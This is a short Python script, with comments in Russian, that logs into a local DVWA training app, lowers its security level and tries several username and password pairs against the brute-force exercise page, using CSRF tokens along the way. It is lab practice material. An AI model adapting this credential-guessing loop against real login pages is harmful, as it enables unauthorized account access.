
#!/usr/bin/python3
import requests
import re

print("DVWA BRUTEFORCE - FINAL WORKING VERSION")
print("="*50)

s = requests.Session()

# 1. Получаем страницу логина и CSRF токен
print("[1] Getting login page...")
r = s.get("http://dvwa.local/login.php")

# Извлекаем CSRF токен
csrf_match = re.search(r'name="user_token" value="([^"]+)"', r.text)
if not csrf_match:
    print("[ERROR] No CSRF token found!")
    exit()
    
csrf_token = csrf_match.group(1)
print(f"[OK] CSRF token: {csrf_token[:10]}...")

# 2. ЛОГИНИМСЯ с CSRF токеном
print("[2] Logging in with CSRF token...")
login_data = {
    'username': 'admin',
    'password': 'password',
    'Login': 'Login',
    'user_token': csrf_token
}

r = s.post("http://dvwa.local/login.php", data=login_data)

# Проверяем успешность - ищем logout
if 'logout.php' in r.text:
    print("[OK] Successfully logged in (found logout link)")
else:
    print("[WARNING] Login might have failed")
    print("Response preview:", r.text[:200])

# 3. Ставим security=low (тоже с CSRF токеном)
print("[3] Setting security to low...")
r = s.get("http://dvwa.local/security.php")

# Извлекаем CSRF токен для security.php
csrf_match = re.search(r'name="user_token" value="([^"]+)"', r.text)
if csrf_match:
    security_csrf = csrf_match.group(1)
    security_data = {
        'security': 'low',
        'seclev_submit': 'Submit',
        'user_token': security_csrf
    }
    s.post("http://dvwa.local/security.php", data=security_data)
    print("[OK] Security set to low")
else:
    print("[WARNING] No CSRF for security page")

# 4. BRUTEFORCE АТАКА
print("\n[4] STARTING BRUTEFORCE ATTACK")
print("-"*40)

brute_url = "http://dvwa.local/vulnerabilities/brute/"

# Пробуем несколько комбинаций
test_cases = [
    ('admin', 'password'),      # Должен работать
    ('admin', 'wrongpass'),     # Должен НЕ работать
    ('gordonb', 'abc123'),      # Другой пользователь
    ('1337', 'charley'),        # Еще пользователь
]

for i, (user, pwd) in enumerate(test_cases, 1):
    print(f"\n[{i}] Testing {user} / {pwd}")
    
    # GET запрос с параметрами
    url = f"{brute_url}?username={user}&password={pwd}&Login=Login"
    r = s.get(url)
    
    # АНАЛИЗ ОТВЕТА:
    response_text = r.text
    
    # Вариант 1: Успех (в DVWA есть эта фраза)
    if 'Welcome to the password protected area' in response_text:
        print(f"  [SUCCESS] Password found: {pwd}")
        print(f"  Proof: Found 'Welcome to the password protected area'")
        
        # Найдем и покажем полную фразу
        for line in response_text.split('\n'):
            if 'Welcome' in line:
                print(f"  Full message: {line.strip()}")
        break
    
    # Вариант 2: Ошибка (стандартная фраза DVWA)
    elif 'Username and/or password incorrect' in response_text:
        print(f"  [FAILED] Incorrect password")
    
    # Вариант 3: Что-то другое
    else:
        print(f"  [UNKNOWN] Response: {len(response_text)} chars")
        
        # Поищем любую полезную информацию
        lines = response_text.split('\n')
        for line in lines:
            clean_line = re.sub('<[^>]+>', '', line).strip()
            if len(clean_line) > 10 and len(clean_line) < 100:
                if 'password' in clean_line.lower() or 'login' in clean_line.lower():
                    print(f"  Found: {clean_line}")

print("\n" + "="*50)
print("COMPLETE")
print("="*50)
